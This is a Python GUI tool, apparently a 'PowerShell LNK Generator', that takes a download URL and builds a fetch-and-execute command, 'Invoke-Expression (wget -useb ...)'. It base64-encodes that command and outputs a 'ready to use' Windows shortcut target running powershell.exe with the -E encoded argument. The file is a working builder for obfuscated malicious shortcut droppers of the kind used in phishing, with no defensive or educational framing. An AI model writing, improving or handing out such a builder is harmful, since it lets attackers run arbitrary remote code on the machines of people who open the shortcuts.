import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import base64
import pyperclip

class PowerShellConverterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("PowerShell LNK Converter")
        self.root.geometry("800x700")
        self.root.resizable(True, True)
        
        style = ttk.Style()
        style.theme_use('clam')
        
        main_frame = ttk.Frame(root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        title_label = ttk.Label(main_frame, text="PowerShell LNK Generator", 
                                 font=('Arial', 16, 'bold'))
        title_label.pack(pady=10)
        
        input_frame = ttk.LabelFrame(main_frame, text="Download URL", padding="10")
        input_frame.pack(fill=tk.X, pady=10)
        
        ttk.Label(input_frame, text="Paste your download link:").pack(anchor=tk.W)
        
        self.url_entry = ttk.Entry(input_frame, width=80, font=('Arial', 10))
        self.url_entry.pack(fill=tk.X, pady=5)
        
        example_url = "https://www.dropbox.com/scl/fi/my_uploads?rlkey=bgo402fdioFkee03n&dl=1"
        ttk.Label(input_frame, text=f"Example: {example_url}", 
                 font=('Arial', 8), foreground='gray').pack(anchor=tk.W)
        
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(button_frame, text="Convert URL", command=self.convert_url,
                  style='Accent.TButton').pack(side=tk.LEFT, padx=5)
        
        ttk.Button(button_frame, text="Clear All", command=self.clear_all).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(button_frame, text="Paste from Clipboard", 
                  command=self.paste_from_clipboard).pack(side=tk.LEFT, padx=5)
        
        results_frame = ttk.LabelFrame(main_frame, text="Conversion Results", padding="10")
        results_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        ttk.Label(results_frame, text="PowerShell Command:", font=('Arial', 10, 'bold')).pack(anchor=tk.W)
        self.ps_command_text = scrolledtext.ScrolledText(results_frame, height=3, 
                                                         font=('Courier', 10), wrap=tk.WORD)
        self.ps_command_text.pack(fill=tk.X, pady=5)
        
        ttk.Label(results_frame, text="Base64 Encoded:", font=('Arial', 10, 'bold')).pack(anchor=tk.W)
        self.base64_text = scrolledtext.ScrolledText(results_frame, height=8, 
                                                     font=('Courier', 10), wrap=tk.WORD)
        self.base64_text.pack(fill=tk.BOTH, expand=True, pady=5)
        
        ttk.Label(results_frame, text="Full LNK Format (ready to use):", 
                 font=('Arial', 10, 'bold')).pack(anchor=tk.W)
        self.lnk_format_text = scrolledtext.ScrolledText(results_frame, height=3, 
                                                         font=('Courier', 10), wrap=tk.WORD)
        self.lnk_format_text.pack(fill=tk.X, pady=5)
        
        copy_frame = ttk.Frame(results_frame)
        copy_frame.pack(fill=tk.X, pady=5)
        
        ttk.Button(copy_frame, text="Copy Base64", 
                  command=lambda: self.copy_to_clipboard(self.base64_text)).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(copy_frame, text="Copy LNK Format", 
                  command=lambda: self.copy_to_clipboard(self.lnk_format_text)).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(copy_frame, text="Copy Full Command", 
                  command=lambda: self.copy_to_clipboard(self.ps_command_text)).pack(side=tk.LEFT, padx=5)
        
        verify_frame = ttk.LabelFrame(main_frame, text="Verification", padding="10")
        verify_frame.pack(fill=tk.X, pady=10)
        
        self.verify_button = ttk.Button(verify_frame, text="Verify Base64 Decodes Correctly", 
                                        command=self.verify_conversion)
        self.verify_button.pack(side=tk.LEFT, padx=5)
        
        self.verify_result = ttk.Label(verify_frame, text="", font=('Arial', 10))
        self.verify_result.pack(side=tk.LEFT, padx=10)
        
        self.status_bar = ttk.Label(main_frame, text="Ready", relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(fill=tk.X, pady=5)
        
    def create_powershell_command(self, url):
        """Create the PowerShell command with the given URL"""
        return f"Invoke-Expression (wget -useb '{url}')"
    
    def powershell_to_base64(self, ps_command):
        """Convert PowerShell command to base64"""
        utf16_bytes = ps_command.encode('utf-16le')
        base64_encoded = base64.b64encode(utf16_bytes).decode('ascii')
        return base64_encoded
    
    def base64_to_powershell(self, base64_string):
        """Convert base64 back to PowerShell command"""
        try:
            bytes_data = base64.b64decode(base64_string)
            ps_command = bytes_data.decode('utf-16le')
            return ps_command
        except Exception as e:
            return f"Error: {str(e)}"
    
    def convert_url(self):
        """Main conversion function"""
        url = self.url_entry.get().strip()
        
        if not url:
            messagebox.showwarning("Warning", "Please enter a URL")
            return
        
        ps_command = self.create_powershell_command(url)
        self.ps_command_text.delete(1.0, tk.END)
        self.ps_command_text.insert(1.0, ps_command)
        
        base64_result = self.powershell_to_base64(ps_command)
        self.base64_text.delete(1.0, tk.END)
        self.base64_text.insert(1.0, base64_result)
        
        lnk_format = f'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nArguments: -E {base64_result}'
        self.lnk_format_text.delete(1.0, tk.END)
        self.lnk_format_text.insert(1.0, lnk_format)
        
        self.status_bar.config(text=f"✓ Converted successfully! Base64 length: {len(base64_result)} characters")
        
        self.verify_conversion()
    
    def verify_conversion(self):
        """Verify that the base64 decodes correctly"""
        base64_text = self.base64_text.get(1.0, tk.END).strip()
        
        if not base64_text:
            self.verify_result.config(text="No base64 to verify", foreground='orange')
            return
        
        decoded = self.base64_to_powershell(base64_text)
        original = self.ps_command_text.get(1.0, tk.END).strip()
        
        if decoded == original:
            self.verify_result.config(text="✓ VERIFICATION PASSED - Decodes correctly!", 
                                     foreground='green')
            messagebox.showinfo("Verification", "✓ SUCCESS: Base64 decodes back to original command!")
        else:
            self.verify_result.config(text="✗ VERIFICATION FAILED", 
                                     foreground='red')
            messagebox.showerror("Verification Failed", 
                                "Base64 does not decode back to original command!")
    
    def copy_to_clipboard(self, text_widget):
        """Copy text from widget to clipboard"""
        text = text_widget.get(1.0, tk.END).strip()
        if text:
            pyperclip.copy(text)
            self.status_bar.config(text=f"✓ Copied to clipboard! ({len(text)} characters)")
            messagebox.showinfo("Success", "Copied to clipboard!")
        else:
            messagebox.showwarning("Warning", "Nothing to copy")
    
    def paste_from_clipboard(self):
        """Paste URL from clipboard"""
        try:
            clipboard_text = pyperclip.paste()
            if clipboard_text:
                self.url_entry.delete(0, tk.END)
                self.url_entry.insert(0, clipboard_text)
                self.status_bar.config(text="✓ Pasted from clipboard")
            else:
                messagebox.showwarning("Warning", "Clipboard is empty")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to paste: {str(e)}")
    
    def clear_all(self):
        """Clear all fields"""
        self.url_entry.delete(0, tk.END)
        self.ps_command_text.delete(1.0, tk.END)
        self.base64_text.delete(1.0, tk.END)
        self.lnk_format_text.delete(1.0, tk.END)
        self.verify_result.config(text="")
        self.status_bar.config(text="Cleared")

def main():
    root = tk.Tk()
    app = PowerShellConverterGUI(root)
    
    root.update_idletasks()
    width = root.winfo_width()
    height = root.winfo_height()
    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f'{width}x{height}+{x}+{y}')
    
    root.mainloop()

if __name__ == "__main__":
    try:
        import pyperclip
    except ImportError:
        print("Installing required package: pyperclip")
        import subprocess
        subprocess.check_call(['pip', 'install', 'pyperclip'])
        import pyperclip
    
    main()
